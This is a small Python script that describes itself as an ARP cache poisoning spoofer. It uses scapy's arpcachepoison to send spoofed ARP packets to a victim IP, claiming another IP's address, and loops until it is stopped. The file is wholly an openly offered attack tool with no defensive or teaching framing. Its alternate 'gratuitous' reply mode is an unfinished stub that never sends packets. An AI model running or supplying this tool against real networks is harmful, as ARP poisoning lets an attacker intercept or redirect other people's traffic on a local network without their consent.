#! /usr/bin/env python
'''
A very basic spoofer which does arp cache poisoning
on a victim by claiming an IP address (via cmd line)
'''
import sys
import os
import os.path
import argparse

from scapy.all import arpcachepoison 

# TODO: add support for gratuitous response cache poisoning
# TODO: cmd line option parsing
def gratuitous(victim, claimed, interval):
  '''
  Send gratuitous ARP replies to <victim> every <interval>,
  with <claimed> as SPA and all other fields normal
  '''
  # Construct an ARP reply packet
  a = ARP
  a.op = 2
  a.pdst = victim
  a.psrc = claimed


def spoof(victim, claimed, interval = 5, mode = 'request'):
  '''
  Use scapy's builtin arpcachepoison to do spoofing attack,
  unless otherwise specified (ie. gratuitious replies).
  '''
  if mode == 'request':
    print 'arpcachepoison'
    arpcachepoison(victim, claimed, interval)
  else:
    gratuitous(victim, claimed, interval)

def main():
  parser = argparse.ArgumentParser(description='Send spoofed ARP packets.')
  parser.add_argument('victim', metavar='V', nargs=1,
                    help='the victim of this attack')
  parser.add_argument('claimed', metavar='C', nargs=1,
                    help='the IP to associate with the attacker MAC')
  args = parser.parse_args()
  '''
  if len(sys.argv) != 3:
    print("Usage: %s victim claimed (gateway)" % sys.argv[0])
    sys.exit(2)
  '''
  print("CTRL C to stop spoofing")
  # victim is the IP of the receiver of spoofed packets
  # claimed is the IP which is claimed by spoofed packets
  victim = args.victim[0]
  claimed = args.claimed[0]
  '''
  victim = sys.argv[1]
  claimed = sys.argv[2]
  '''
  spoof(victim, claimed)

if __name__ == '__main__':
  main()
